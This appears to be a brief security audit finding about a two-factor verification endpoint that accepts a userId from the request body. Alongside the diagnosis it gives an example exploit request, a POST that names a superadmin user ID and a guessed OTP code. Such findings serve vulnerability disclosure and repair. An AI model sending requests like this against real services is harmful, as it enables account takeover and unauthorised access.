diagnosis: The step-2 2FA verification route accepts userId directly in the request body instead of deriving it from a cryptographically signed pre-authentication session cookie or temporary JWT. If an attacker knows or brute-forces an OTP token (or if a shared/test secret exists), they can authenticate as any arbitrary userId.
exploit_request:
POST /api/auth/2fa/verify HTTP/1.1
Host: auth.saas.internal:6001
Content-Type: application/json

{
  "userId": "usr_superadmin_001",
  "token": "492810"
}
